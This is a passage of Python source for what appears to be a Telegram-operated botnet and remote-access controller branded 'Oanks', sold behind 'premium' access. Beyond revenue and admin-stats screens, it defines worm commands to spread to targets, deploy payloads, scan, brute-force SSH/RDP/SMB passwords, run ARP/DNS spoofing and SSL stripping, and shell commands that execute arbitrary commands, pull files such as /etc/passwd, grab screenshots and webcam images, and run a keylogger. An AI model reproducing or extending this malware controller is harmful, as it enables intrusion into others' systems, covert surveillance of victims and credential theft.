            f"<b>📆 This Week:</b> ${revenue_data.get('this_week', 0):.2f}\n"
            f"<b>📊 This Month:</b> ${revenue_data.get('this_month', 0):.2f}\n\n"
            f"<b>💳 By Payment Method:</b>\n{method_breakdown if method_breakdown else '  No data available.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "admin_revenue_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(revenue_text, keyboard=keyboard)

    @oanks_command("admin", "Display admin command statistics", admin_only=True)
    def cmd_admin_stats(self, telegram_id: int, args: List[str]) -> str:
        """Show admin-specific statistics."""
        admin_commands = [h for h in self._command_history if h.get("command", "").startswith("/admin")]
        admin_cmd_count = len(admin_commands)

        stats_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_STATS} ADMIN STATISTICS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🔒 Admin Activity:</b>\n"
            f"  • Admin Commands: {admin_cmd_count}\n"
            f"  • Total System Commands: {self._total_commands}\n"
            f"  • Admin Command Share: {(admin_cmd_count / max(self._total_commands, 1)) * 100:.1f}%\n\n"
            f"<b>👑 Admin Users:</b>\n"
            f"  • Total Admins: {len([s for s in self._sessions.values() if s.is_admin])}\n"
            f"  • Active Admins: {len([s for s in self._sessions.values() if s.is_admin and time.time() - s.last_activity < 3600])}\n\n"
            f"<b>📊 System Health:</b>\n"
            f"  • Error Rate: {(self._total_errors / max(self._total_commands, 1)) * 100:.2f}%\n"
            f"  • Avg Response Time: {statistics.mean([h.get('duration', 0) for h in self._command_history]) if self._command_history else 0:.3f}s\n"
            f"  • Uptime: {int((time.time() - self._start_time) // 3600)}h {int((time.time() - self._start_time) % 3600 // 60)}m\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = [[{"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": "admin_stats_refresh"},
                     {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}]]
        return OanksCommandResult.ok(stats_text, keyboard=keyboard)


    # ═══════════════════════════════════════════════════════════════════════════════
    # WORM MODULE COMMANDS — NETWORK DOMINATION
    # ═══════════════════════════════════════════════════════════════════════════════

    @oanks_command("worm", "Check worm network status and active nodes", premium_only=True)
    def cmd_worm_status(self, telegram_id: int, args: List[str]) -> str:
        """Display worm module status and active infections."""
        worm_data = {"active_nodes": 0, "total_infections": 0, "spread_rate": 0.0, "targets": [], "last_activity": 0}
        if self._worm_module:
            try: worm_data = self._worm_module.get_status()
            except Exception as e: self._logger.error(f"Worm status failed: {e}")

        targets = worm_data.get("targets", [])
        target_lines = []
        for t in targets[:10]:
            target_lines.append(
                f"  • {html.escape(t.get('host', 'Unknown'))} | "
                f"Status: {t.get('status', 'Unknown')} | "
                f"Last: {datetime.datetime.fromtimestamp(t.get('last_seen', 0)).strftime('%H:%M:%S') if t.get('last_seen') else 'N/A'}"
            )

        status_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_WORM} WORM NETWORK STATUS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🐛 Active Nodes:</b> {worm_data.get('active_nodes', 0)}\n"
            f"<b>📊 Total Infections:</b> {worm_data.get('total_infections', 0)}\n"
            f"<b>🌊 Spread Rate:</b> {worm_data.get('spread_rate', 0):.2f}/hour\n"
            f"<b>⏱️ Last Activity:</b> {datetime.datetime.fromtimestamp(worm_data.get('last_activity', 0)).strftime('%Y-%m-%d %H:%M:%S') if worm_data.get('last_activity') else 'N/A'}\n\n"
            f"<b>🎯 Recent Targets:</b>\n"
            f"{'\n'.join(target_lines) if target_lines else '  No active targets.'}\n\n"
            f"<b>⚡ Commands:</b>\n"
            f"  • /worm_spread — Spread to new targets\n"
            f"  • /worm_target — Manage target list\n"
            f"  • /worm_payload — Deploy payloads\n"
            f"  • /worm_scan — Scan for vulnerabilities\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_worm_menu_keyboard()
        return OanksCommandResult.ok(status_text, keyboard=keyboard)

    @oanks_command("worm", "Spread worm to specified targets", premium_only=True)
    def cmd_worm_spread(self, telegram_id: int, args: List[str]) -> str:
        """Spread worm to targets."""
        if not args:
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_SPREAD} WORM SPREAD</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Usage: /worm_spread [target1] [target2] ...\n\n"
                f"<b>Examples:</b>\n"
                f"  /worm_spread 192.168.1.1\n"
                f"  /worm_spread example.com 10.0.0.5\n"
                f"  /worm_spread --subnet 192.168.1.0/24\n\n"
                f"<b>⚠️ Warning:</b> Only target systems you own or have explicit permission to test.\n\n"
                f"{OanksBranding.FOOTER}"
            )

        targets = args
        result_data = {"success": False, "infected": 0, "failed": 0, "details": []}

        if self._worm_module:
            try:
                result_data = self._worm_module.spread(targets=targets, initiated_by=telegram_id)
            except Exception as e:
                self._logger.error(f"Worm spread failed: {e}")
                return OanksCommandResult.error(f"Spread failed: {html.escape(str(e))}")
        else:
            # Simulate for demonstration
            result_data = {"success": True, "infected": len(targets), "failed": 0,
                          "details": [{"target": t, "status": "simulated"} for t in targets]}

        detail_lines = []
        for d in result_data.get("details", [])[:20]:
            status_emoji = "✅" if d.get("status") == "success" else "❌" if d.get("status") == "failed" else "⏳"
            detail_lines.append(f"  {status_emoji} {html.escape(d.get('target', 'Unknown'))} — {d.get('status', 'Unknown')}")

        spread_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_SPREAD} WORM SPREAD COMPLETE</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🎯 Targets:</b> {len(targets)}\n"
            f"<b>✅ Infected:</b> {result_data.get('infected', 0)}\n"
            f"<b>❌ Failed:</b> {result_data.get('failed', 0)}\n\n"
            f"<b>📋 Results:</b>\n"
            f"{'\n'.join(detail_lines) if detail_lines else '  No details available.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_worm_menu_keyboard()
        return OanksCommandResult.ok(spread_text, keyboard=keyboard)

    @oanks_command("worm", "Set or manage worm targets", premium_only=True)
    def cmd_worm_target(self, telegram_id: int, args: List[str]) -> str:
        """Manage worm target list."""
        if not args:
            # Show current targets
            targets = []
            if self._worm_module:
                try: targets = self._worm_module.get_targets()
                except Exception as e: self._logger.error(f"Target list failed: {e}")

            target_lines = []
            for t in targets[:20]:
                target_lines.append(
                    f"  🎯 {html.escape(t.get('host', 'Unknown'))} | "
                    f"Priority: {t.get('priority', 'Normal')} | "
                    f"{'✅' if t.get('active') else '❌'}"
                )

            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_TARGET} WORM TARGETS</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"<b>Total Targets:</b> {len(targets)}\n\n"
                f"{'\n'.join(target_lines) if target_lines else '  No targets configured.'}\n\n"
                f"<b>Usage:</b> /worm_target [add|remove|list|clear] [host]\n"
                f"  /worm_target add 192.168.1.1\n"
                f"  /worm_target remove example.com\n"
                f"  /worm_target clear\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_worm_menu_keyboard()
            )

        action = args[0].lower()
        if action == "add" and len(args) > 1:
            host = args[1]
            if self._worm_module:
                try: self._worm_module.add_target(host, added_by=telegram_id)
                except Exception as e: self._logger.error(f"Add target failed: {e}")
            return OanksCommandResult.ok(
                f"<b>🎯 TARGET ADDED</b>\n\n"
                f"Host: <code>{html.escape(host)}</code>\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_worm_menu_keyboard()
            )
        elif action == "remove" and len(args) > 1:
            host = args[1]
            if self._worm_module:
                try: self._worm_module.remove_target(host)
                except Exception as e: self._logger.error(f"Remove target failed: {e}")
            return OanksCommandResult.ok(
                f"<b>🎯 TARGET REMOVED</b>\n\n"
                f"Host: <code>{html.escape(host)}</code>\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_worm_menu_keyboard()
            )
        elif action == "clear":
            if self._worm_module:
                try: self._worm_module.clear_targets()
                except Exception as e: self._logger.error(f"Clear targets failed: {e}")
            return OanksCommandResult.ok(
                f"<b>🎯 ALL TARGETS CLEARED</b>\n\n"
                f"The target list has been emptied.\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_worm_menu_keyboard()
            )
        else:
            return OanksConfig.ERROR_INVALID_ARGS

    @oanks_command("worm", "Deploy or manage worm payloads", premium_only=True)
    def cmd_worm_payload(self, telegram_id: int, args: List[str]) -> str:
        """Manage worm payloads."""
        payloads = []
        if self._worm_module:
            try: payloads = self._worm_module.list_payloads()
            except Exception as e: self._logger.error(f"Payload list failed: {e}")

        payload_lines = []
        for p in payloads:
            payload_lines.append(
                f"  📦 {html.escape(p.get('name', 'Unknown'))} | "
                f"Type: {p.get('type', 'N/A')} | "
                f"Size: {self._format_bytes(p.get('size', 0))} | "
                f"{'✅' if p.get('active') else '❌'}"
            )

        payload_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_PAYLOAD} WORM PAYLOADS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Available Payloads:</b> {len(payloads)}\n\n"
            f"{'\n'.join(payload_lines) if payload_lines else '  No payloads configured.'}\n\n"
            f"<b>Usage:</b>\n"
            f"  /worm_payload deploy [name] [target]\n"
            f"  /worm_payload list\n"
            f"  /worm_payload info [name]\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_worm_menu_keyboard()
        return OanksCommandResult.ok(payload_text, keyboard=keyboard)

    @oanks_command("worm", "Scan targets for vulnerabilities", premium_only=True)
    def cmd_worm_scan(self, telegram_id: int, args: List[str]) -> str:
        """Scan targets for vulnerabilities."""
        if not args:
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_SCAN} VULNERABILITY SCAN</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Usage: /worm_scan [target] [options]\n\n"
                f"<b>Examples:</b>\n"
                f"  /worm_scan 192.168.1.1\n"
                f"  /worm_scan example.com --deep\n"
                f"  /worm_scan 10.0.0.0/24 --quick\n\n"
                f"<b>Options:</b>\n"
                f"  --quick — Fast scan (top 100 ports)\n"
                f"  --deep — Full port scan + service detection\n"
                f"  --vuln — Vulnerability assessment\n"
                f"  --os — OS fingerprinting\n\n"
                f"{OanksBranding.FOOTER}"
            )

        target = args[0]
        options = args[1:] if len(args) > 1 else []

        scan_result = {"success": False, "open_ports": [], "services": [], "vulnerabilities": [], "os_guess": "Unknown"}
        if self._worm_module:
            try: scan_result = self._worm_module.scan(target=target, options=options, scanned_by=telegram_id)
            except Exception as e: self._logger.error(f"Scan failed: {e}")
        else:
            scan_result = {"success": True, "open_ports": [22, 80, 443], "services": ["ssh", "http", "https"],
                          "vulnerabilities": [], "os_guess": "Linux", "note": "Simulated — Phase 10 not connected"}

        port_lines = []
        for port in scan_result.get("open_ports", []):
            port_lines.append(f"  🔓 Port {port}")

        vuln_lines = []
        for v in scan_result.get("vulnerabilities", []):
            vuln_lines.append(f"  ⚠️ {html.escape(v.get('name', 'Unknown'))} — {v.get('severity', 'Unknown')}")

        scan_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_SCAN} SCAN RESULTS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🎯 Target:</b> <code>{html.escape(target)}</code>\n"
            f"<b>🖥️ OS Guess:</b> {html.escape(scan_result.get('os_guess', 'Unknown'))}\n\n"
            f"<b>🔓 Open Ports ({len(scan_result.get('open_ports', []))}):</b>\n"
            f"{'\n'.join(port_lines) if port_lines else '  No open ports detected.'}\n\n"
            f"<b>⚠️ Vulnerabilities ({len(scan_result.get('vulnerabilities', []))}):</b>\n"
            f"{'\n'.join(vuln_lines) if vuln_lines else '  No vulnerabilities found.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_worm_menu_keyboard()
        return OanksCommandResult.ok(scan_text, keyboard=keyboard)

    @oanks_command("worm", "Crack passwords for specified targets", premium_only=True)
    def cmd_worm_crack(self, telegram_id: int, args: List[str]) -> str:
        """Password cracking interface."""
        if not args:
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_CRACK} PASSWORD CRACKER</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Usage: /worm_crack [target] [service] [method]\n\n"
                f"<b>Examples:</b>\n"
                f"  /worm_crack 192.168.1.1 ssh dictionary\n"
                f"  /worm_crack example.com ftp brute\n"
                f"  /worm_crack 10.0.0.5 rdp hybrid\n\n"
                f"<b>Methods:</b>\n"
                f"  dictionary — Wordlist attack\n"
                f"  brute — Brute force\n"
                f"  hybrid — Dictionary + mutations\n"
                f"  rainbow — Rainbow table lookup\n\n"
                f"<b>Services:</b> ssh, ftp, rdp, smb, telnet, http\n\n"
                f"{OanksBranding.FOOTER}"
            )

        target = args[0]
        service = args[1] if len(args) > 1 else "ssh"
        method = args[2] if len(args) > 2 else "dictionary"

        crack_result = {"success": False, "found": [], "attempts": 0, "duration": 0}
        if self._worm_module:
            try: crack_result = self._worm_module.crack(target=target, service=service, method=method, initiated_by=telegram_id)
            except Exception as e: self._logger.error(f"Crack failed: {e}")
        else:
            crack_result = {"success": True, "found": [], "attempts": 1000, "duration": 5.2,
                           "note": "Simulated — Phase 10 not connected"}

        found_lines = []
        for cred in crack_result.get("found", []):
            found_lines.append(f"  🔓 {html.escape(cred.get('username', 'N/A'))}:{html.escape(cred.get('password', 'N/A'))}")

        crack_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_CRACK} CRACK RESULTS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🎯 Target:</b> <code>{html.escape(target)}</code>\n"
            f"<b>🔧 Service:</b> {html.escape(service.upper())}\n"
            f"<b>🔨 Method:</b> {html.escape(method.title())}\n"
            f"<b>🔄 Attempts:</b> {crack_result.get('attempts', 0):,}\n"
            f"<b>⏱️ Duration:</b> {crack_result.get('duration', 0):.2f}s\n\n"
            f"<b>🔓 Credentials Found ({len(crack_result.get('found', []))}):</b>\n"
            f"{'\n'.join(found_lines) if found_lines else '  No credentials found.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_worm_menu_keyboard()
        return OanksCommandResult.ok(crack_text, keyboard=keyboard)

    @oanks_command("worm", "Execute man-in-the-middle attack", premium_only=True)
    def cmd_worm_mitm(self, telegram_id: int, args: List[str]) -> str:
        """MITM attack interface."""
        if not args:
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_MITM} MAN-IN-THE-MIDDLE</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Usage: /worm_mitm [target] [interface] [method]\n\n"
                f"<b>Examples:</b>\n"
                f"  /worm_mitm 192.168.1.5 eth0 arp\n"
                f"  /worm_mitm 10.0.0.2 wlan0 dns\n\n"
                f"<b>Methods:</b>\n"
                f"  arp — ARP spoofing\n"
                f"  dns — DNS spoofing\n"
                f"  ssl — SSL stripping\n"
                f"  dhcp — DHCP exhaustion\n\n"
                f"{OanksBranding.FOOTER}"
            )

        target = args[0]
        interface = args[1] if len(args) > 1 else "eth0"
        method = args[2] if len(args) > 2 else "arp"

        mitm_result = {"success": False, "packets_captured": 0, "credentials": [], "duration": 0}
        if self._worm_module:
            try: mitm_result = self._worm_module.mitm(target=target, interface=interface, method=method, initiated_by=telegram_id)
            except Exception as e: self._logger.error(f"MITM failed: {e}")
        else:
            mitm_result = {"success": True, "packets_captured": 150, "credentials": [], "duration": 30,
                          "note": "Simulated — Phase 10 not connected"}

        cred_lines = []
        for c in mitm_result.get("credentials", []):
            cred_lines.append(f"  🔓 {html.escape(c.get('host', 'N/A'))} | {html.escape(c.get('user', 'N/A'))}:{html.escape(c.get('pass', 'N/A'))}")

        mitm_text = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_MITM} MITM ATTACK RESULTS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>🎯 Target:</b> <code>{html.escape(target)}</code>\n"
            f"<b>🌐 Interface:</b> {html.escape(interface)}\n"
            f"<b>🔨 Method:</b> {html.escape(method.upper())}\n"
            f"<b>📦 Packets Captured:</b> {mitm_result.get('packets_captured', 0)}\n"
            f"<b>⏱️ Duration:</b> {mitm_result.get('duration', 0)}s\n\n"
            f"<b>🔓 Credentials ({len(mitm_result.get('credentials', []))}):</b>\n"
            f"{'\n'.join(cred_lines) if cred_lines else '  No credentials captured.'}\n\n"
            f"{OanksBranding.FOOTER}"
        )
        keyboard = self._build_worm_menu_keyboard()
        return OanksCommandResult.ok(mitm_text, keyboard=keyboard)

    @oanks_command("worm", "Execute DNS manipulation attack", premium_only=True)
    def cmd_worm_dns(self, telegram_id: int, args: List[str]) -> str:
        """DNS manipulation interface."""
        if not args:
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_DNS} DNS MANIPULATION</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Usage: /worm_dns [action] [domain] [ip]\n\n"
                f"<b>Examples:</b>\n"
                f"  /worm_dns spoof example.com 1.2.3.4\n"
                f"  /worm_dns poison target.com 192.168.1.100\n"
                f"  /worm_dns cache-flush\n"
                f"  /worm_dns list\n\n"
                f"<b>Actions:</b>\n"
                f"  spoof — DNS spoofing\n"
                f"  poison — Cache poisoning\n"
                f"  hijack — DNS hijacking\n"
                f"  cache-flush — Clear DNS cache\n"
                f"  list — Show active rules\n\n"
                f"{OanksBranding.FOOTER}"
            )

        action = args[0].lower()
        if action == "list":
            rules = []
            if self._worm_module:
                try: rules = self._worm_module.list_dns_rules()
                except Exception as e: self._logger.error(f"DNS list failed: {e}")

            rule_lines = []
            for r in rules:
                rule_lines.append(f"  🌐 {html.escape(r.get('domain', 'N/A'))} → {html.escape(r.get('ip', 'N/A'))}")

            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_DNS} ACTIVE DNS RULES</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"<b>Total Rules:</b> {len(rules)}\n\n"
                f"{'\n'.join(rule_lines) if rule_lines else '  No active rules.'}\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_worm_menu_keyboard()
            )

        if len(args) < 3: return OanksConfig.ERROR_INVALID_ARGS
        domain = args[1]
        ip = args[2]

        if self._worm_module:
            try: self._worm_module.dns_manipulate(action=action, domain=domain, ip=ip, initiated_by=telegram_id)
            except Exception as e: self._logger.error(f"DNS manipulate failed: {e}")

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_DNS} DNS RULE APPLIED</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"<b>Action:</b> {html.escape(action.upper())}\n"
            f"<b>Domain:</b> <code>{html.escape(domain)}</code>\n"
            f"<b>IP:</b> <code>{html.escape(ip)}</code>\n\n"
            f"DNS rule has been applied to the network.\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=self._build_worm_menu_keyboard()
        )

    # ═══════════════════════════════════════════════════════════════════════════════
    # SHELL ACCESS COMMANDS — REMOTE CONTROL
    # ═══════════════════════════════════════════════════════════════════════════════

    @oanks_command("shell", "Execute shell commands on connected systems", premium_only=True)
    def cmd_shell(self, telegram_id: int, args: List[str]) -> str:
        """Execute shell commands."""
        if not args:
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_SHELL} SHELL ACCESS</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Usage: /shell [command]\n\n"
                f"<b>Examples:</b>\n"
                f"  /shell whoami\n"
                f"  /shell ls -la\n"
                f"  /shell ps aux\n"
                f"  /shell netstat -an\n"
                f"  /shell cat /etc/passwd\n\n"
                f"<b>⚠️ Warning:</b> Commands execute with system privileges.\n"
                f"Use with extreme caution.\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_shell_menu_keyboard()
            )

        command = " ".join(args)

        if self._shell_module:
            try:
                result = self._shell_module.execute("shell", command=command, executed_by=telegram_id)
                if result:
                    output = result.get("output", "No output")
                    exit_code = result.get("exit_code", -1)
                    duration = result.get("duration", 0)

                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>{OanksBranding.EMOJI_COMMAND} SHELL EXECUTION</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>Command:</b> <code>{html.escape(command)}</code>\n"
                        f"<b>Exit Code:</b> {exit_code}\n"
                        f"<b>Duration:</b> {duration:.3f}s\n\n"
                        f"<b>Output:</b>\n"
                        f"<pre>{html.escape(output[:3000])}</pre>\n\n"
                        f"{OanksBranding.FOOTER}",
                        keyboard=self._build_shell_menu_keyboard()
                    )
            except Exception as e:
                self._logger.error(f"Shell execution failed: {e}")
                return OanksCommandResult.error(f"Shell error: {html.escape(str(e))}")

        # Fallback: local execution (DANGEROUS — for demo only)
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            return OanksCommandResult.ok(
                f"<b>{OanksBranding.EMOJI_COMMAND} SHELL OUTPUT (LOCAL)</b>\n\n"
                f"<b>Command:</b> <code>{html.escape(command)}</code>\n"
                f"<b>Exit Code:</b> {result.returncode}\n\n"
                f"<pre>{html.escape(output[:3000])}</pre>\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_shell_menu_keyboard()
            )
        except Exception as e:
            return OanksCommandResult.error(f"Execution failed: {html.escape(str(e))}")

    @oanks_command("shell", "Upload file to connected system", premium_only=True)
    def cmd_upload(self, telegram_id: int, args: List[str]) -> str:
        """Upload file interface."""
        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_UPLOAD} FILE UPLOAD</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"Send a file directly to this chat.\n"
            f"Supported formats: CSV, JSON, Excel, TXT, LOG\n\n"
            f"<b>Max Size:</b> {OanksConfig.MAX_FILE_SIZE_MB}MB\n\n"
            f"The Overlord will parse and offer actions.\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=self._build_shell_menu_keyboard()
        )

    @oanks_command("shell", "Download file from connected system", premium_only=True)
    def cmd_download(self, telegram_id: int, args: List[str]) -> str:
        """Download file interface."""
        if not args:
            return OanksCommandResult.ok(
                f"{OanksBranding.BANNER_SMALL}\n\n"
                f"<b>{OanksBranding.EMOJI_DOWNLOAD} FILE DOWNLOAD</b>\n"
                f"<code>═══════════════════════════════════════</code>\n\n"
                f"Usage: /download [remote_path]\n\n"
                f"<b>Examples:</b>\n"
                f"  /download /etc/passwd\n"
                f"  /download /var/log/syslog\n"
                f"  /download C:\\Windows\\System32\\drivers\\etc\\hosts\n\n"
                f"{OanksBranding.FOOTER}",
                keyboard=self._build_shell_menu_keyboard()
            )

        remote_path = " ".join(args)

        if self._shell_module:
            try:
                result = self._shell_module.execute("download", path=remote_path, requested_by=telegram_id)
                if result and result.get("file_content"):
                    return OanksCommandResult.ok(
                        f"<b>{OanksBranding.EMOJI_DOWNLOAD} FILE DOWNLOADED</b>\n\n"
                        f"<b>Path:</b> <code>{html.escape(remote_path)}</code>\n"
                        f"<b>Size:</b> {self._format_bytes(len(result['file_content']))}\n\n"
                        f"{OanksBranding.FOOTER}",
                        file_content=result["file_content"],
                        file_name=os.path.basename(remote_path),
                        keyboard=self._build_shell_menu_keyboard()
                    )
            except Exception as e: self._logger.error(f"Download failed: {e}")

        return OanksCommandResult.error(f"Download failed for: {html.escape(remote_path)}")

    @oanks_command("shell", "Capture screenshot from connected system", premium_only=True)
    def cmd_screenshot(self, telegram_id: int, args: List[str]) -> str:
        """Capture screenshot."""
        if self._shell_module:
            try:
                result = self._shell_module.execute("screenshot", requested_by=telegram_id)
                if result and result.get("image_data"):
                    return OanksCommandResult.ok(
                        f"<b>{OanksBranding.EMOJI_SCREENSHOT} SCREENSHOT CAPTURED</b>\n\n"
                        f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"<b>Size:</b> {self._format_bytes(len(result['image_data']))}\n\n"
                        f"{OanksBranding.FOOTER}",
                        file_content=result["image_data"],
                        file_name=f"screenshot_{int(time.time())}.png",
                        keyboard=self._build_shell_menu_keyboard()
                    )
            except Exception as e: self._logger.error(f"Screenshot failed: {e}")

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_SCREENSHOT} SCREENSHOT</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"Screenshot capture requested.\n"
            f"(Shell module not connected — capture simulated)\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=self._build_shell_menu_keyboard()
        )

    @oanks_command("shell", "Access webcam on connected system", premium_only=True)
    def cmd_webcam(self, telegram_id: int, args: List[str]) -> str:
        """Webcam capture interface."""
        if self._shell_module:
            try:
                result = self._shell_module.execute("webcam", requested_by=telegram_id)
                if result and result.get("image_data"):
                    return OanksCommandResult.ok(
                        f"<b>{OanksBranding.EMOJI_WEBCAM} WEBCAM CAPTURE</b>\n\n"
                        f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"<b>Size:</b> {self._format_bytes(len(result['image_data']))}\n\n"
                        f"{OanksBranding.FOOTER}",
                        file_content=result["image_data"],
                        file_name=f"webcam_{int(time.time())}.jpg",
                        keyboard=self._build_shell_menu_keyboard()
                    )
            except Exception as e: self._logger.error(f"Webcam failed: {e}")

        return OanksCommandResult.ok(
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>{OanksBranding.EMOJI_WEBCAM} WEBCAM ACCESS</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
            f"Webcam capture requested.\n"
            f"(Shell module not connected — capture simulated)\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=self._build_shell_menu_keyboard()
        )

    @oanks_command("shell", "Start keylogger on connected system", premium_only=True)
    def cmd_keylog_start(self, telegram_id: int, args: List[str]) -> str:
        """Start keylogger."""
        if self._shell_module:
            try:
                result = self._shell_module.execute("keylog_start", initiated_by=telegram_id)
                if result and result.get("success"):
                    return OanksCommandResult.ok(
                        f"{OanksBranding.BANNER_SMALL}\n\n"
                        f"<b>{OanksBranding.EMOJI_KEYLOG} KEYLOGGER STARTED</b>\n"
                        f"<code>═══════════════════════════════════════</code>\n\n"
                        f"<b>Status:</b> ✅ Active\n"
                        f"<b>Started By:</b> <code>{telegram_id}</code>\n"
                        f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"Use /keylog_dump to retrieve captured data.\n\n"
                        f"{OanksBranding.FOOTER}",
                        keyboard=self._build_shell_menu_keyboard()
                    )
            except Exception as e: self._logger.error(f"Keylog start failed: {e}")

        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_KEYLOG} KEYLOGGER</b>\n\n"
            f"Keylogger start requested.\n"
            f"(Shell module not connected — request logged)\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=self._build_shell_menu_keyboard()
        )

    @oanks_command("shell", "Dump keylogger data from connected system", premium_only=True)
    def cmd_keylog_dump(self, telegram_id: int, args: List[str]) -> str:
        """Dump keylogger data."""
        if self._shell_module:
            try:
                result = self._shell_module.execute("keylog_dump", requested_by=telegram_id)
                if result:
                    data = result.get("data", "")
                    return OanksCommandResult.ok(
                        f"<b>{OanksBranding.EMOJI_KEYLOG} KEYLOG DATA</b>\n\n"
                        f"<b>Entries:</b> {result.get('entries', 0)}\n"
                        f"<b>Duration:</b> {result.get('duration', 0)}s\n\n"
                        f"<pre>{html.escape(data[:3000])}</pre>\n\n"
                        f"{OanksBranding.FOOTER}",
                        keyboard=self._build_shell_menu_keyboard()
                    )
            except Exception as e: self._logger.error(f"Keylog dump failed: {e}")

        return OanksCommandResult.ok(
            f"<b>{OanksBranding.EMOJI_KEYLOG} KEYLOG DUMP</b>\n\n"
            f"No keylog data available.\n"
            f"Use /keylog_start to begin capture.\n\n"
            f"{OanksBranding.FOOTER}",
            keyboard=self._build_shell_menu_keyboard()
        )


    # ═══════════════════════════════════════════════════════════════════════════════
    # CALLBACK HANDLERS — INTERACTIVE MENU SYSTEM
    # ═══════════════════════════════════════════════════════════════════════════════

    @oanks_callback("menu_main", "Return to main menu")
    def cb_menu_main(self, callback_query: Dict[str, Any]) -> str:
        """Return to main menu."""
        user_id = callback_query["from"]["id"]
        session = self._get_session(user_id)
        if session:
            session.current_menu = "main"
            session.menu_stack.clear()

        welcome = (
            f"{OanksBranding.BANNER_SMALL}\n\n"
            f"<b>👑 OANKS COMMAND CENTER</b>\n"
            f"<code>═══════════════════════════════════════</code>\n\n"
